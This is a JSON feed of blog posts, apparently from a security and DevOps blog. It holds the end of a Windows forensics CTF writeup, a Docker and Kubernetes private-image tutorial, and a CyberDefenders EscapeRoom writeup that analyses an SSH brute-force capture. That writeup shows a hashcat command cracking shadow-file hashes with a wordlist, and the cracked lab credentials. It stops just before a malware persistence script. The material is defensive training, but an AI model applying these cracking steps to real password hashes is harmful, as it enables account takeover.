class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exiftool 20210429_152043.jpg</span><br><span class=\"line\">....</span><br><span class=\"line\">....</span><br><span class=\"line\">GPS Latitude                    : 16 deg 0<span class=\"string\">&#x27; 0.00&quot; S</span></span><br><span class=\"line\"><span class=\"string\">GPS Longitude                   : 23 deg 0&#x27;</span> 0.00<span class=\"string\">&quot; E</span></span><br><span class=\"line\"><span class=\"string\">Focal Length                    : 3.7 mm</span></span><br><span class=\"line\"><span class=\"string\">GPS Position                    : 16 deg 0&#x27; 0.00&quot;</span> S, 23 deg 0<span class=\"string\">&#x27; 0.00&quot; E</span></span><br><span class=\"line\"><span class=\"string\">Light Value                     : 13.7</span></span><br></pre></td></tr></table></figure>\n<p>Ok let’s try to find the country using GPS Coordinates Finder</p>\n<p><img data-src=\"https://imgur.com/freR9Vd.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  Zambia</p>\n</div>\n<blockquote>\n<p>9- What is the parent folder name picture “20210429_151535.jpg” was in before the suspect copy it to “contact” folder on his desktop?</p>\n</blockquote>\n<p>Shellbags explorer will solve our problem here! But wait man ! What are ShellBag artifacts?<br>\n <code>ShellBags</code>  are a popular artifact in Windows forensics often used to identify the existence of directories on local, network, and removable storage devices. ShellBags are stored as a highly nested and hierarchal set of subkeys in the UsrClass<br>\nThis registyr hive will save us :  <code>[root]\\Users\\John Doe\\AppData\\Local\\Microsoft\\Windows\\Usrclass.dat</code></p>\n<p>ٍ<img data-src=\"https://imgur.com/IAJ0GBZ.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  Camera</p>\n</div>\n<blockquote>\n<p>10- A Windows password hashes for an account are below. What is the user’s password?</p>\n</blockquote>\n<p>Just try an online hash cracker</p>\n<p>ٍ<img data-src=\"https://imgur.com/eQ1U5w7.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:   AFR1CA!</p>\n</div>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/09/08/Kubernetes/private-docker-k8s/",
            "url": "http://example.com/2022/09/08/Kubernetes/private-docker-k8s/",
            "title": "Dockerize a website & Pull it privately in k8s",
            "date_published": "2022-09-08T00:47:58.000Z",
            "content_html": "<p>In this article you will learn how to containerize a static website using nginx. Then we will push a private docker image in dockerhub. Finally we will use this private image to be pulled in our Kubernetes cluster ! I will split this article to 2 small and easy steps, you can skip any one you want !</p>\n<h1 id=\"containerize-a-static-website-and-push-it-on-dockerhub\"><a class=\"markdownIt-Anchor\" href=\"#containerize-a-static-website-and-push-it-on-dockerhub\">#</a> Containerize a static website and push it on dockerhub</h1>\n<p>In this Section we will choose a template from random websites that provides free css templates, then we will dockerize it !</p>\n<h2 id=\"dockerize-the-website\"><a class=\"markdownIt-Anchor\" href=\"#dockerize-the-website\">#</a> Dockerize the website</h2>\n<p>I’ll choose this template from this <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZS1jc3MuY29tL2ZyZWUtY3NzLXRlbXBsYXRlcy9wYWdlMjgyL3JveWFsLWNhcnM=\">link</span><br>\n<img data-src=\"https://imgur.com/ngHGyw0.png\" alt=\"\"></p>\n<p>Download it and let’s create our Dockerfile !<br>\nWe will use the  <code>nginx:alpine</code>  image and copy all the assets of the website to the  <code>/usr/share/nginx/html</code>  to be hosted by the nginx webserver.</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> nginx:alpine</span><br><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> /usr/share/nginx/html</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> <span class=\"built_in\">rm</span> -rf ./*</span></span><br><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> ./ ./</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> <span class=\"built_in\">chmod</span> +r -R . </span></span><br><span class=\"line\"><span class=\"keyword\">ENTRYPOINT</span><span class=\"language-bash\"> [<span class=\"string\">&quot;nginx&quot;</span>,<span class=\"string\">&quot;-g&quot;</span>,<span class=\"string\">&quot;daemon off;&quot;</span>]</span></span><br></pre></td></tr></table></figure>\n<p>Now it’s time to build the container image</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ sudo docker build . -t &lt;user_name&gt;/cars-app</span><br><span class=\"line\">Sending build context to Docker daemon  2.454MB</span><br><span class=\"line\">Step 1/5 : FROM nginx:alpine</span><br><span class=\"line\">alpine: Pulling from library/nginx</span><br><span class=\"line\">213ec9aee27d: Downloading [===================================&gt;               ]  2.018MB/2.806MB</span><br><span class=\"line\">2546ae67167b: Downloading [=========&gt;                                         ]  1.461MB/7.403MB</span><br><span class=\"line\">23b845224e13: Download complete</span><br><span class=\"line\">9bd5732789a3: Download complete</span><br><span class=\"line\">328309e59ded: Waiting</span><br><span class=\"line\">b231d02e5150: Waiting</span><br></pre></td></tr></table></figure>\n<p>Now let’s create a container to test it before make push it!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ sudo docker run --name car-demo -p 8686:80 &lt;user_name&gt;/cars-app</span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: using the &quot;epoll&quot; event method</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: nginx/1.23.1</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: built by gcc 11.2.1 20220219 (Alpine 11.2.1_git20220219)</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: OS: Linux 5.15.0-41-generic</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: start worker processes</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: start worker process 7</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: start worker process 8</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: start worker process 9</span></span><br><span class=\"line\">2022/09/08 22:53:47 [notice] 1<span class=\"comment\">#1: start worker process 10</span></span><br></pre></td></tr></table></figure>\n<p>Sanity Check please ! Oh everything is OK !</p>\n<p><img data-src=\"https://imgur.com/nQ6NcxG.png\" alt=\"\"></p>\n<h2 id=\"push-the-container-image-to-private-repo\"><a class=\"markdownIt-Anchor\" href=\"#push-the-container-image-to-private-repo\">#</a> Push the container image to private repo</h2>\n<p>Now go and create a private repository in your dockerhub to push it !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ sudo docker image push &lt;user_name&gt;/cars-app</span><br><span class=\"line\">Using default tag: latest</span><br><span class=\"line\">The push refers to repository [docker.io/&lt;user_name&gt;/cars-app]</span><br><span class=\"line\">41c30355eff8: Pushed</span><br><span class=\"line\">f2ba5e032e84: Pushed</span><br><span class=\"line\">43e1f37b87cb: Pushed</span><br><span class=\"line\">bf4e176a4d9b: Mounted from library/nginx</span><br><span class=\"line\">a1d571e4e83d: Mounted from library/nginx</span><br><span class=\"line\">6d97b4d00719: Mounted from library/nginx</span><br><span class=\"line\">2a7647ca3937: Mounted from library/nginx</span><br><span class=\"line\">549c42eea4a6: Mounted from library/nginx</span><br><span class=\"line\">994393dc58e7: Mounted from library/nginx</span><br></pre></td></tr></table></figure>\n<p>Now it’s time to deal with our kubernetes cluster !</p>\n<h1 id=\"use-the-private-docker-image-in-kubernetes\"><a class=\"markdownIt-Anchor\" href=\"#use-the-private-docker-image-in-kubernetes\">#</a> Use the private docker image in Kubernetes</h1>\n<p>In this demo I will use a production kubernetes cluster with 1 master node and 1 worker node</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl get nodes</span><br><span class=\"line\">NAME      STATUS   ROLES                  AGE   VERSION</span><br><span class=\"line\">master    Ready    control-plane,master   77d   v1.23.1</span><br><span class=\"line\">worker1   Ready    &lt;none&gt;                 77d   v1.23.1</span><br></pre></td></tr></table></figure>\n<p>Let’s create a namespace for this demo !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl create ns private-docker</span><br><span class=\"line\">namespace/private-docker created</span><br></pre></td></tr></table></figure>\n<p>To make our cluster pull private images we need to create a special secret object with specific type called  <code>docker-registry</code>  secret. To make this secret work correctly you must specify the docker registry, username , password and docker email!</p>\n<p>I prefer to put this params in variable environment to work with it easly</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> EMAIL=&lt;email&gt;</span><br><span class=\"line\"><span class=\"built_in\">export</span> USERNAME=&lt;user_name&gt;</span><br><span class=\"line\"><span class=\"built_in\">export</span> PASSWORD=&lt;password&gt;</span><br><span class=\"line\"><span class=\"built_in\">export</span> SERVER=&lt;docker_registry&gt;</span><br></pre></td></tr></table></figure>\n<p>In case you will use dockerhub as your registry you don’t have to specify the server !</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl create -n private-docker secret docker-registry docker-secret --docker-username=$USERNAME --docker-password=$PASSWORD --docker-email=$EMAIL</span><br><span class=\"line\">secret/docker-secret created</span><br></pre></td></tr></table></figure>\n<p>Now let’s create a pod with the image that we made it !</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span></span><br><span class=\"line\">    <span class=\"attr\">run:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">private-docker</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">containers:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">image:</span> <span class=\"string\">&lt;user_name&gt;/cars-app</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">    <span class=\"attr\">resources:</span> &#123;&#125;</span><br><span class=\"line\">  <span class=\"attr\">dnsPolicy:</span> <span class=\"string\">ClusterFirst</span></span><br><span class=\"line\">  <span class=\"attr\">restartPolicy:</span> <span class=\"string\">Always</span></span><br><span class=\"line\"><span class=\"attr\">status:</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>If you try create this pod with this YAML definition you’ll get a  <code>ErrImagePull</code>  because we don’t specify the docker secret that we created</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl get pods -n private-docker</span><br><span class=\"line\">NAME           READY   STATUS         RESTARTS   AGE</span><br><span class=\"line\">cars-app-pod   0/1     ErrImagePull   0          5s</span><br></pre></td></tr></table></figure>\n<p>Let’s figure out the problem with  <code>kubectl describe</code>  command. Take a look at the events that occur when the pod try to pull the container image!</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Events:</span><br><span class=\"line\"> Type     Reason          Age                From               Message</span><br><span class=\"line\"> ----     ------          ----               ----               -------</span><br><span class=\"line\"> Normal   Scheduled       44s                default-scheduler  Successfully assigned private-docker/cars-app-pod to worker1</span><br><span class=\"line\"> Normal   SandboxChanged  40s                kubelet            Pod sandbox changed, it will be killed and re-created.</span><br><span class=\"line\"> Normal   Pulling         26s (x2 over 43s)  kubelet            Pulling image &quot;&lt;user_name&gt;/cars-app&quot;</span><br><span class=\"line\"> Warning  Failed          23s (x2 over 40s)  kubelet            Failed to pull image &quot;&lt;user_name&gt;/cars-app&quot;: rpc error: code = Unknown desc = Error response from daemon: pull access denied for &lt;user_name&gt;/cars-app, repository does not exist or may require &#x27;docker login&#x27;: denied: requested access to the resource is denied</span><br><span class=\"line\"> Warning  Failed          23s (x2 over 40s)  kubelet            Error: ErrImagePull</span><br><span class=\"line\"> Normal   BackOff         12s (x4 over 39s)  kubelet            Back-off pulling image &quot;&lt;user_name&gt;/cars-app&quot;</span><br><span class=\"line\"> Warning  Failed          12s (x4 over 39s)  kubelet            Error: ImagePullBackOff</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Specifying the docker secret in the pod YAML definition will solve this problem. The pod will pull the container image without any problem<br>\nAdding  <code>imagePullSecrets</code>  attributes in the  <code>spec</code>  of the pod allow the pod to pull this image. The Final YAML definition will be similar to the following one !</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span></span><br><span class=\"line\">    <span class=\"attr\">run:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">private-docker</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">containers:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">image:</span> <span class=\"string\">&lt;user_name&gt;/cars-app</span></span><br><span class=\"line\">    <span class=\"attr\">name:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">    <span class=\"attr\">resources:</span> &#123;&#125;</span><br><span class=\"line\">  <span class=\"attr\">imagePullSecrets:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">docker-secret</span></span><br><span class=\"line\">  <span class=\"attr\">dnsPolicy:</span> <span class=\"string\">ClusterFirst</span></span><br><span class=\"line\">  <span class=\"attr\">restartPolicy:</span> <span class=\"string\">Always</span></span><br><span class=\"line\"><span class=\"attr\">status:</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>Create the pod again and check it with  <code>kubectl get pods</code>  and don’t forget to specify the namespace!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl get pods -n private-docker</span><br><span class=\"line\">NAME           READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">cars-app-pod   1/1     Running   0          4s</span><br></pre></td></tr></table></figure>\n<p>I want to make sure that everything is ok, so i will expose this pod using the NodePort service. The following service YAML Definition will expose the pod correctly :</p>\n<figure class=\"highlight yaml\"><figcaption><span>yaml</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Service</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span></span><br><span class=\"line\">    <span class=\"attr\">run:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">private-docker</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">ports:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">port:</span> <span class=\"number\">80</span></span><br><span class=\"line\">    <span class=\"attr\">protocol:</span> <span class=\"string\">TCP</span></span><br><span class=\"line\">    <span class=\"attr\">targetPort:</span> <span class=\"number\">80</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">run:</span> <span class=\"string\">cars-app-pod</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">NodePort</span></span><br></pre></td></tr></table></figure>\n<p>Let’s now check the service and get the node port that we will use it to test the pod</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">raf@4n6nk8s:~$ kubectl get svc -n private-docker</span><br><span class=\"line\">NAME           TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE</span><br><span class=\"line\">cars-app-pod   NodePort   10.111.98.22   &lt;none&gt;        80:31651/TCP   6s</span><br></pre></td></tr></table></figure>\n<p>Now you can visit either <span class=\"exturl\" data-url=\"aHR0cDovL21hc3RlcjozMTY1MQ==\">http://master:31651</span> or <span class=\"exturl\" data-url=\"aHR0cDovL3dvcmtlcjE6MzE2NTE=\">http://worker1:31651</span> and you will find the static website work without any problem!</p>\n<p><img data-src=\"https://imgur.com/3TVOl36.png\" alt=\"\"></p>\n",
            "tags": [
                "kubernetes"
            ]
        },
        {
            "id": "http://example.com/2022/09/07/CyberDefenders/EscapeRoom/",
            "url": "http://example.com/2022/09/07/CyberDefenders/EscapeRoom/",
            "title": "CyberDefenders Writeup EscapeRoom",
            "date_published": "2022-09-07T15:28:39.000Z",
            "content_html": "<p>This CTF challenge is made by The Honeynet Project organization. This challenge is a combination of several entry to intermediate-level tasks of increasing difficulty focusing on authentication, information hiding, and cryptography.</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>You belong to a company specializing in hosting web applications through KVM-based Virtual Machines. Over the weekend, one VM went down, and the site administrators fear this might be the result of malicious activity. They extracted a few logs from the environment in hopes that you might be able to determine what happened.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvMTg=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvMTg=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - EscapeRoom</p>\n          </div></div><div class=\"item\" title=\"Author - The Honeynet Project\" style=\"--block-color:#fcc11c;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9Qcm9qZWN0SG9uZXluZXQ=\" data-background-image=\"https://pbs.twimg.com/profile_images/582417177254334464/BNceiZYA_400x400.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9Qcm9qZWN0SG9uZXluZXQ=\">Author - The Honeynet Project</span>\n          <p class=\"desc\">The Honeynet Project Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<p>We start analyzing the pcap file, i open it with Brim Security and checking the alerts!! Oh god! A lot of ssh flows! mmm I guess the attacker try to gain access through the ssh service, he did a bruteforce attack !<br>\n<img data-src=\"https://imgur.com/cXk82fL.png\" alt=\"\"></p>\n<blockquote>\n<p>1- What service did the attacker use to gain access to the system?</p>\n</blockquote>\n<p>The attacker use ssh protocol to gain access to the system !</p>\n<div class=\"note success\">\n<p>Answer: ssh</p>\n</div>\n<blockquote>\n<p>2- What attack type was used to gain access to the system?(one word)</p>\n</blockquote>\n<p>We found a lot of ssh packets! I am sure this is a bruteforce attack</p>\n<div class=\"note success\">\n<p>Answer: bruteforce</p>\n</div>\n<blockquote>\n<p>3- What was the tool the attacker possibly used to perform this attack?</p>\n</blockquote>\n<p>One of the most famous tools that can do this type of attack is hydra<br>\nHydra is an amazing tool for testing the strength of your SSH security. It is capable of running through massive lists of usernames, passwords, and targets to test if you or a user is using a potentially vulnerable password.</p>\n<div class=\"note success\">\n<p>Answer: Hydra</p>\n</div>\n<blockquote>\n<p>4- How many failed attempts were there?</p>\n</blockquote>\n<p>Let’s inspect the alert events in Brim Security and apply the count() by feature in the  <code>alert.signature</code> . We found 53  <code>NetSSH Hardcoded in Metasploit</code> . We decrease by 1 the success one!<br>\n<img data-src=\"https://imgur.com/DpgkZjt.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 52</p>\n</div>\n<p>We have the hashes of the passwords! We know that the hashes are SHA-512(UNIX). The black cat (oh means hashcat) will help us cracking these hashes!<br>\nٍ<img data-src=\"https://imgur.com/DN0qNUF.png\" alt=\"\"></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashcat -a 0 -m 1800 shadow.log rockyou.txt</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Running</span><br><span class=\"line\">Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))</span><br><span class=\"line\">Hash.Target......: crack.txt</span><br><span class=\"line\">Time.Started.....: Wed Sep  7 23:58:23 2022 (43 mins, 15 secs)</span><br><span class=\"line\">Time.Estimated...: Fri Sep  9 04:15:48 2022 (1 day, 3 hours)</span><br><span class=\"line\">Kernel.Feature...: Pure Kernel</span><br><span class=\"line\">Guess.Base.......: File (/mnt/c/Users/Mohamed Rafraf/Desktop/rockyou.txt)</span><br><span class=\"line\">Guess.Queue......: 1/1 (100.00%)</span><br><span class=\"line\">Speed.1.........:      986 H/s (5.30ms) @ Accel:32 Loops:1024 Thr:1 Vec:4</span><br><span class=\"line\">Recovered........: 3/10 (30.00%) Digests, 3/10 (30.00%) Salts</span><br><span class=\"line\">Progress.........: 3579360/143443840 (2.50%)</span><br><span class=\"line\">Rejected.........: 0/3579360 (0.00%)</span><br><span class=\"line\">Restore.Point....: 357920/14344384 (2.50%)</span><br><span class=\"line\">Restore.Sub.1...: Salt:5 Amplifier:0-1 Iteration:4096-5000</span><br><span class=\"line\">Candidate.Engine.: Device Generator</span><br><span class=\"line\">Candidates.1....: donjoe -&gt; dominique12</span><br><span class=\"line\"></span><br><span class=\"line\">[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>5- What credentials (username:password) were used to gain access? Refer to shadow.log and sudoers.log.</p>\n</blockquote>\n<p>Just wait for hashcat man!</p>\n<div class=\"note success\">\n<p>manager:forgot</p>\n</div>\n<blockquote>\n<p>6- What other credentials (username:password) could have been used to gain access also have SUDO privileges? Refer to shadow.log and sudoers.log.</p>\n</blockquote>\n<p>Hashcat will save you for sure !</p>\n<div class=\"note success\">\n<p>sean:spectre</p>\n</div>\n<blockquote>\n<p>7- What is the tool used to download malicious files on the system?</p>\n</blockquote>\n<p>Let’s check the  <code>user-agent</code>  in brim security. you can do it with wireshark too!<br>\n<img data-src=\"https://imgur.com/P9haLBY.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: wget</p>\n</div>\n<blockquote>\n<p>8- How many files the attacker download to perform malware installation?</p>\n</blockquote>\n<p>Checking the non-media files in brim security will help us to know about the files</p>\n<p><img data-src=\"https://imgur.com/P6St7uU.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 3</p>\n</div>\n<blockquote>\n<p>9- What is the main malware MD5 hash?</p>\n</blockquote>\n<p>The malware is an executable file for sure! let’s check it</p>\n<p><img data-src=\"https://imgur.com/VN12PmD.png\" alt=\"\"></p>\n<p>Open the details about it and you’ll get the md5sum !</p>\n<p><img data-src=\"https://imgur.com/YgnR9gz.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 772b620736b760c1d736b1e6ba2f885b</p>\n</div>\n<p>We found this bash script that rename the malware mail and hide it in /var/mail/ directory and make it executable at the startup!</p>\n<figure 